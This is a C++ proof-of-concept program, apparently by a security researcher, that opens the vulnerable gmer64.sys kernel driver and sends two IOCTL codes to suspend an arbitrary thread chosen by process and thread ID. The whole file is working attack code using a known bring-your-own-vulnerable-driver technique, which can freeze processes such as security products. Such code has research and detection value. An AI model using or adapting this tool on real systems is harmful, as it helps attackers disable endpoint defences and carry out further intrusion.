//
// Author: Jonathan Johnson
// Description: This program will interact with the gmer64.sys driver to suspend a thread in a process. Driver can be found: https://www.loldrivers.io/drivers/7ce8fb06-46eb-4f4f-90d5-5518a6561f15/
//

#include <Windows.h>
#include <iostream>

//
// Thank you to ZeroMemoryEx for their POC which made me realize I needed INITIALIZE_IOCTL_CODE/0x9876C004. Code: https://github.com/ZeroMemoryEx/Blackout/blob/master/Blackout/Blackout.cpp
//
#define INITIALIZE_IOCTL_CODE 0x9876C004
#define SUSPEND_THREAD_IOCTL_CODE 0x9876C098

struct TargetProcess {
    DWORD ProcessId;
    DWORD ThreadId;
};

int main(int argc, const char* argv[]) {
    if (argc < 3) {
        printf("Usage: SuspendThreadDriver.exe <PID> <TID>\n");
        return 0;
    }


    //
    // Getting a handle to the device object via CreateFile
    //
    HANDLE hDevice = NULL;
    hDevice = CreateFileW(L"\\\\.\\gmer64", GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hDevice == INVALID_HANDLE_VALUE || hDevice == NULL) {
		printf("[-] Failed to get a handle to the device object. Error: %d\n", GetLastError());
        return 0;
	}

    printf("[+] Successfully got a handle to the device object.\n");

   

    DWORD bytes; 
    TargetProcess data;
    data.ProcessId = atoi(argv[1]);
    data.ThreadId = atoi(argv[2]);

    DWORD output[2] = { 0 };
    DWORD outputSize = sizeof(output);

    //
    // Calling DeviceIoControl to send processId/threadId to the driver via IOCTL 0x9876C004
    //

    BOOL deviceControl = DeviceIoControl(hDevice, INITIALIZE_IOCTL_CODE, &data, sizeof(data), output, outputSize, &bytes, NULL);
    if (!deviceControl)
    {
        printf("Failed to call DeviceIoControl for INITIALIZE_IOCTL_CODE. Error: %d\n", GetLastError());
        return 1;
    }

    //
    // Calling DeviceIoControl to send processId/threadId to the driver via IOCTL 0x9876C098
    //

    deviceControl = DeviceIoControl(hDevice, SUSPEND_THREAD_IOCTL_CODE, &data, sizeof(data), output, outputSize, &bytes, NULL);
    if (!deviceControl) {
        if (GetLastError() == 6) {
            printf("Nighty Night Thread!\n");
            goto Exit;
        }
		printf("[-] Failed to call DeviceIoControl for SUSPEND_THREAD_IOCTL_CODE. Error: %d\n", GetLastError());
		goto Exit;
	}

    printf("Nighty Night Thread!\n");

Exit:
    if (hDevice != NULL && hDevice != INVALID_HANDLE_VALUE) {
		CloseHandle(hDevice);
	}


    return 0;
}